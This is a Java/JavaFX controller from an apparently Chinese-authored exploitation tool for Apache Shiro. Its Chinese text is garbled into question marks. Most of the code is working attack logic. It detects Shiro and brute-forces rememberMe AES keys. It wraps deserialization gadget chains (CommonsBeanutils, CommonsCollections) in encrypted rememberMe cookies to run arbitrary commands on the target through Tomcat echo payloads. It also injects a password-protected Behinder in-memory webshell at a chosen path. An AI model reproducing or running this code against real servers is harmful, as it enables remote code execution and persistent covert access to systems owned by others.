package cn.safe6.controller;

import cn.safe6.core.Constants;
import cn.safe6.core.ControllersFactory;
import cn.safe6.core.http.Request;
import cn.safe6.core.jobs.BurstJob;
import cn.safe6.payload.memshell.Loader;
import cn.safe6.util.*;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Modality;
import javafx.stage.Stage;
import javafx.stage.Window;
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Controller {

    @FXML
    public Button checkButton;

    @FXML
    public ChoiceBox method;

    @FXML
    public TextArea postData;

    @FXML
    public Button burstKey;

    @FXML
    public CheckBox gcm;

    @FXML
    public ChoiceBox gadget;

    @FXML
    public ChoiceBox echoType;

    @FXML
    public TextField cmd;

    @FXML
    public Button execCmd;

    @FXML
    public ChoiceBox bruteType;

    @FXML
    public TextArea note;
    @FXML
    public TextArea log;

    final private Map<String, Object> paramsContext = ControllersFactory.paramsContext;
    @FXML
    public CheckBox isShowPayload;

    @FXML
    public TextField rememberMe;
    @FXML
    public TextField aesKey;

    @FXML
    public Button inject;

    @FXML
    public TextField shellPasswd;

    @FXML
    public ChoiceBox shellType;
    @FXML
    public TextField path;



    ExecutorService pool = Executors.newFixedThreadPool(8);

    public static LogUtil logUtil;

    @FXML
    private TextField target;


    @FXML
    private MenuItem proxySetupBtn;


    // ????????????????????????
    public static Map<String, Object> settingInfo = new HashMap();

    //??????shell?????????????????????
    private boolean shell =false;

    private boolean isShiro =false;


    public void initEvent() {
        method.setOnAction(event -> {
                    if (method.getValue().equals("POST")) {
                        postData.setDisable(false);
                        logUtil.printInfoLog("?????????url??????????????????????????????host????????????????????????????????????url???", false);
                        logUtil.printInfoLog("post????????????http????????????https??????????????????url", true);
                    }
                    if (method.getValue().equals("GET")) {
                        postData.setDisable(true);
                    }
                }
        );

    }


    // ??????????????????
    public void basic() {
        //???????????????
        logUtil = new LogUtil(this.log);

        ControllersFactory.controllers.put(Controller.class.getSimpleName(), this);

        this.log.setText(Constants.BASICINFO);
        this.log.setWrapText(true);

        this.note.setText("?????????????????????\r\n");
        this.note.setWrapText(true);

        ObservableList<String> methodData = FXCollections.observableArrayList("GET", "POST");
        method.setValue("GET");
        method.setItems(methodData);

        ObservableList<String> checkTypeData = FXCollections.observableArrayList("SimplePrincipalCollection", "dnsLog.cn");
        bruteType.setValue("SimplePrincipalCollection");
        bruteType.setItems(checkTypeData);

        ObservableList<String> echoTypeData = FXCollections.observableArrayList();
        echoTypeData.add("TomcatEcho");
        echoTypeData.add("TomcatEcho1");
        echoTypeData.add("TomcatEchoAll");
        echoType.setValue("TomcatEcho");
        echoType.setItems(echoTypeData);

        ObservableList<String> shellTypeData = FXCollections.observableArrayList("BehinderFilter");
        shellType.setValue("BehinderFilter");
        shellType.setItems(shellTypeData);

        ObservableList<String> gadgetData = FXCollections.observableArrayList();
        gadgetData.add("CommonsBeanutils1");
        gadgetData.add("CommonsBeanutils183NOCC");
        gadgetData.add("CommonsBeanutils192NOCC");
        gadgetData.add("CommonsCollections2");
        gadgetData.add("CommonsCollections3");
        gadgetData.add("CommonsCollections4");
        gadgetData.add("CommonsCollectionsK1");
        gadgetData.add("CommonsCollectionsK2");
        gadget.setValue("CommonsBeanutils183NOCC");
        gadget.setItems(gadgetData);

    }

    @FXML
    public void check() {
        try {
            Platform.runLater(() -> checkButton.setDisable(true));
            this.validAllDataAndSetConfig();
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
            Map<String, Object> header = (Map<String, Object>) paramsContext.get("header");
            if (header == null) {
                header = new HashMap<>();
            }
            if (params == null) {
                params = new HashMap<>();
            }

            logUtil.printInfoLog("??????????????????????????????shiro", false);
            if (ShiroTool.shiroDetect(url, method, header, params, rmeValue)) {
                logUtil.printSucceedLog("??????shiro??????");
                isShiro =true;
            } else {
                logUtil.printAbortedLog("?????????shiro??????", false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            Platform.runLater(() -> checkButton.setDisable(false));
        }
    }


    public void initialize() {
        try {
            this.initToolbar();
            this.basic();
            this.initEvent();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    @FXML
    public void burstKey(ActionEvent actionEvent) {
        try {
            Platform.runLater(() -> burstKey.setDisable(true));

            this.validAllDataAndSetConfig();
            List<String> keys = this.getShiroKeys();
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
            Map<String, Object> header = (Map<String, Object>) paramsContext.get("header");
            if (header == null) {
                header = new HashMap<>();
            }
            if (params == null) {
                params = new HashMap<>();
            }

            if (isShiro){
                pool.submit(new BurstJob(url, method, params, keys));
            }else {
                this.check();
                if (isShiro)pool.submit(new BurstJob(url, method, params, keys));
            }


        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            //burstKey.setDisable(false);
            Platform.runLater(() -> burstKey.setDisable(false));
        }


    }

    @FXML
    public void execCmd(ActionEvent actionEvent) {
        try {
            Platform.runLater(() -> execCmd.setDisable(true));
            Thread.sleep(50);

            this.validAllDataAndSetConfig();
            String cmd1 = cmd.getText();
            if (cmd1 == null || cmd1.trim().equals("")) {
                Tools.alert("????????????", "????????????????????????whoami");
                return;
            }
            String key = aesKey.getText();

            if (key == null || key.trim().equals("")) {
                Tools.alert("AES????????????", "???????????????");
                return;
            }
            paramsContext.put("Key", aesKey.getText());
            String gadgetName = gadget.getValue().toString();
            paramsContext.put("exp", gadget.getValue().toString());
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");



            //?????????
            Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
            //rce??????
            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echoType.getValue().toString());

            //??????payload
            byte[] expPayload = (byte[]) clazz1.getMethod("getPayload").invoke(clazz1);

            // loader
            byte[] loader = Loader.getPayload();
            Method mtd = clazz.getMethod("getPayload", byte[].class);
            byte[] payload = (byte[]) mtd.invoke(null, loader);


            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
            String encryptData;
            if (gcm.isSelected()) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
            }
            String data;
            //?????????header??????8k??????header too large??????
            header.put("cookie", rmeValue + "=" + encryptData);
            header.put("s6", cmd1);
            params.put("fuck",Base64.getEncoder().encodeToString(expPayload));
            if (isShowPayload.isSelected()) {
                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                Controller.logUtil.printData(header.toString());
            }

//            if (method.equals(Constants.METHOD_GET)) {
//                // data = HttpClientUtil.httpGetRequest(url, header);
//                for (String s : params.keySet()) {
//                    if (url.contains("?")){
//                        url=url+"&"+s+"="+params.get(s);
//                    }else {
//                        url=url+"?"+s+"="+params.get(s);
//                    }
//                }
//                //System.out.println(url);
//                data = HttpTool.get(url, header);
//            } else {
//                data = HttpClientUtil.httpPostRequest(url, header, params);
//            }
            //?????????????????????post???????????????url??????????????????????????????????????????????????????????????????
            data = HttpClientUtil.httpPostRequest(url, header, params);
            if (data != null) {
                if (data.contains("$$")) {
                    log.setText("");
                    logUtil.printData(data.replace("$", ""));
                } else {
                    logUtil.printWarningLog("??????????????????! ?????????????????????????????????", true);
                    if (isShowPayload.isSelected()) {
                        logUtil.printData(data);
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            Platform.runLater(() -> execCmd.setDisable(false));
        }

    }


    @FXML
    public void injectShell(ActionEvent actionEvent) {
        try {
            Platform.runLater(() -> inject.setDisable(true));
            Thread.sleep(50);
            this.validAllDataAndSetConfig();

            String key = aesKey.getText();
            if (key == null || key.trim().equals("")) {
                Tools.alert("AES????????????", "???????????????");
                return;
            }

            String passwd = shellPasswd.getText();
            if (passwd == null || passwd.trim().equals("")) {
                Tools.alert("shell????????????", "?????????shell??????");
                return;
            }


            String path1 = path.getText();
            if (path1 == null || path1.trim().equals("")) {
                Tools.alert("????????????", "?????????shell??????");
                return;
            }

            String gadgetName = gadget.getValue().toString();
            String shellName = shellType.getValue().toString();
            String url = paramsContext.get("url").toString();
            //String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");

            byte[] loader = Loader.getPayload();
            Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
            Method mtd = clazz.getMethod("getPayload", byte[].class);
            byte[] payload = (byte[]) mtd.invoke(null, loader);

            //?????????????????????header
            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);

            String encryptData;
            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
            }


            //???????????????????????????payload???post?????????
            Class clazz1 = Class.forName(Constants.SHELL_PACK + shellName);
            Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
            params = new HashMap<>();
            //???????????????????????????pageContext
            //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
            //????????????????????????shell
            String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
            //System.out.println(shellData);
            params.put("fuck",shellData);
            //?????????header??????8k??????header too large??????
            //??????????????????????????????urlencode
            header.put("cookie", rmeValue + "=" + encryptData);

            if (isShowPayload.isSelected()) {
                Controller.logUtil.printData(header.toString());
                Controller.logUtil.printData(params.toString());
            }
            logUtil.printInfoLog("?????????????????????",true);
            //?????????post???????????????get??????????????????400
            String ss= HttpClientUtil.httpPostRequest(url, header, params);
            //String ss =HttpTool.post(url,postData,header);
            if (ss.contains("inject success")) {
                logUtil.printSucceedLog("????????????????????????");
                logUtil.printSucceedLog("????????????:  "+url+path1);
                logUtil.printSucceedLog("shell??????:  "+passwd);
            }else {
                logUtil.printAbortedLog("????????????????????????",true);
                //logUtil.printData(header1);
                //logUtil.printData(data);
                //logUtil.printData(ss);
            }
        } catch (Exception e) {
            e.printStackTrace();
            logUtil.printAbortedLog("????????????????????????",true);
        } finally {
            Platform.runLater(() -> inject.setDisable(false));
        }

    }


    /**
     * ????????????,??????config??????
     */
    public void validAllDataAndSetConfig() {
        //logUtil.printInfoLog("??????????????????????????????",true);
        String target = this.target.getText().trim();
        if (method.getValue().equals(Constants.METHOD_GET)) {
            if (!Tools.checkTheURL(target)) {
                Tools.alert("URL??????", "URL?????????????????????????????????http://127.0.0.1:8080/login");
                return;
            }
            paramsContext.put("url", target);
            paramsContext.put("method", Constants.METHOD_GET);
        } else {
            paramsContext.put("method", Constants.METHOD_POST);
            String requestBody = postData.getText();
            if (requestBody == null || requestBody.trim().equals("")) {
                Tools.alert("HTTP??????????????????", "????????????????????????HTTP??????");
                return;
            }
            Request request = null;
            try {
                //??????post???
                request = HttpTool.parseRequest(requestBody);
            } catch (Exception e) {
                // e.printStackTrace();
                Tools.alert("HTTP??????????????????", "????????????????????????HTTP??????");
                return;
            }
            if (request != null) {
                paramsContext.put("header", request.getHeader());
                paramsContext.put("params", request.getParams());
                paramsContext.put("paramsStr", request.getParamsStr());

                if (Tools.checkTheURL(target)){
                    paramsContext.put("url", target+request.getRequestUrl());
                }else {
                    paramsContext.put("url", "http://"+request.getHeader().get("Host").toString()+request.getRequestUrl());
                }
                logUtil.printSucceedLog("??????URL:"+paramsContext.get("url"));
            } else {
                Tools.alert("HTTP??????????????????", "????????????????????????HTTP??????");
            }

        }
        String rmeValue = rememberMe.getText();
        if (rmeValue == null || rmeValue.trim().equals("")) {
            Tools.alert("shiro????????????", "????????????????????????rememberMe");
            return;
        }

        paramsContext.put("rmeValue", rmeValue);
        paramsContext.put("exp", gadget.getValue().toString());
        paramsContext.put("bruteType", bruteType.getValue().toString());
        if (gcm.isSelected()) {
            paramsContext.put("AES", Constants.AES_GCM);
        } else {
            paramsContext.put("AES", Constants.AES_CBC);
        }

        paramsContext.computeIfAbsent("params", k -> new HashMap<String, Object>());
    }


    /**
     * ??????keys??????
     *
     * @return
     */
    private List<String> getShiroKeys() {

        List<String> list = new ArrayList<>();
        try {
            //???????????????????????????key
            File file = new File("shirokeys.txt");
            if (file.exists()) {
                list.addAll(FileUtils.readLines(file, Constants.ENCODING_UTF8));
            }
            //???????????????????????????key
            if (list.size() == Constants.LIST_SIZE_ZERO) {
                InputStream inputStream = Controller.class.getClassLoader().getResourceAsStream("ShiroKeys.txt");
                if (inputStream != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                    while (reader.ready()) {
                        list.add(reader.readLine());
                    }
                }

            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return list;
    }

    /**
     * ???map?????????????????????url??????
     *
     * @param url
     * @param params
     */
    private String parseGetData(String url, Map<String, Object> params) {
        if (url.contains("?")) {
            for (String s : params.keySet()) {
                url = url + "&" + s + "=" + params.get(s).toString();
            }
        } else {
            url = url + "?";
            for (String s : params.keySet()) {
                url = url + s + "=" + params.get(s).toString() + "&";
            }
        }

        return url;
    }


    @FXML
    public void about() {
        Alert alert = new Alert(AlertType.NONE);

        // ??? x ??????
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });

        DialogPane dialogPane = new DialogPane();

        TextArea textArea = new TextArea(Constants.BASICINFO);
        textArea.setEditable(false);
        textArea.setWrapText(true);

        dialogPane.setContent(textArea);


        Image image = new Image(String.valueOf(getClass().getClassLoader().getResource("wx.jpg")));
        ImageView imageView = new ImageView();
        imageView.setImage(image);

        imageView.setFitWidth(200);
        imageView.setPreserveRatio(true);

        dialogPane.setGraphic(imageView);

        ButtonType confirm = new ButtonType("??????");
        dialogPane.getButtonTypes().setAll(confirm);
        alert.setDialogPane(dialogPane);

        alert.showAndWait();


    }

    @FXML
    public void alertKey() throws Exception {

        ClassLoader classLoader = getClass().getClassLoader();
        Parent root = FXMLLoader.load(classLoader.getResource("keytool.fxml"));

        Stage stage = new Stage();
        stage.initModality(Modality.APPLICATION_MODAL);
        //stage.setOpacity(1);
        stage.setTitle("shiroKey??????");
        stage.setScene(new Scene(root, 600, 140));
        stage.setResizable(false);
        stage.showAndWait();


    }


    private void initToolbar() {
        //?????? ??????
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("??????");
            RadioButton disableRadio = new RadioButton("??????");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            disableRadio.setSelected(true);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("?????????");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP?????????");
            TextField IPText = new TextField();
            Label PortLabel = new Label("?????????");
            TextField PortText = new TextField();
            Label userNameLabel = new Label("????????????");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("?????????");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("??????");
            Button saveBtn = new Button("??????");


            try {
                Proxy proxy = (Proxy) settingInfo.get("proxy");

                if (proxy != null) {
                    enableRadio.setSelected(true);

                } else {
                    disableRadio.setSelected(true);
                }

                if (settingInfo.size() > 0) {
                    String type = (String) settingInfo.get("type");
                    if (type.equals("HTTP")) {
                        typeCombo.getSelectionModel().select(0);
                    } else if (type.equals("SOCKS")) {
                        typeCombo.getSelectionModel().select(1);
                    }

                    String ip = (String) settingInfo.get("ip");
                    String port = (String) settingInfo.get("port");
                    IPText.setText(ip);
                    PortText.setText(port);
                    String username = (String) settingInfo.get("username");
                    String password = (String) settingInfo.get("password");
                    userNameText.setText(username);
                    passwordText.setText(password);
                }


            } catch (Exception var28) {
                // this.proxyStatusLabel.setText("????????????????????????????????????");
                this.log.appendText("????????????????????????????????????");
                var28.printStackTrace();
            }


            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    this.settingInfo.put("proxy", null);
                    // this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {

                    final String type;
                    if (!userNameText.getText().trim().equals("")) {
                        final String proxyUser = userNameText.getText().trim();
                        type = passwordText.getText();
                        Authenticator.setDefault(new Authenticator() {
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, type.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault(null);
                    }

                    this.settingInfo.put("username", userNameText.getText());
                    this.settingInfo.put("password", passwordText.getText());
                    InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));

                    this.settingInfo.put("ip", IPText.getText());
                    this.settingInfo.put("port", PortText.getText());
                    String proxy_type = typeCombo.getValue().toString();
                    settingInfo.put("type", proxy_type);
                    Proxy proxy;
                    if (proxy_type.equals("HTTP")) {
                        proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                        this.settingInfo.put("proxy", proxy);
                    } else if (proxy_type.equals("SOCKS")) {
                        proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                        this.settingInfo.put("proxy", proxy);
                    }
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }
            });

            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });

    }


    public void payloadGen(ActionEvent actionEvent) throws IOException {
        ClassLoader classLoader = getClass().getClassLoader();
        Parent root = FXMLLoader.load(classLoader.getResource("payloadGen.fxml"));

        Stage stage = new Stage();
        stage.initModality(Modality.APPLICATION_MODAL);
        //stage.setOpacity(1);
        stage.setTitle("???payload??????");
        stage.setScene(new Scene(root, 630, 410));
        stage.setResizable(false);
        stage.showAndWait();
    }

    public void jrmp(ActionEvent actionEvent) throws IOException {
        ClassLoader classLoader = getClass().getClassLoader();
        Parent root = FXMLLoader.load(classLoader.getResource("jrmp.fxml"));

        Stage stage = new Stage();
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.setOpacity(1);
        stage.setTitle("jrmp??????");
        stage.setScene(new Scene(root, 500, 80));
        stage.setResizable(false);
        stage.showAndWait();
    }
}
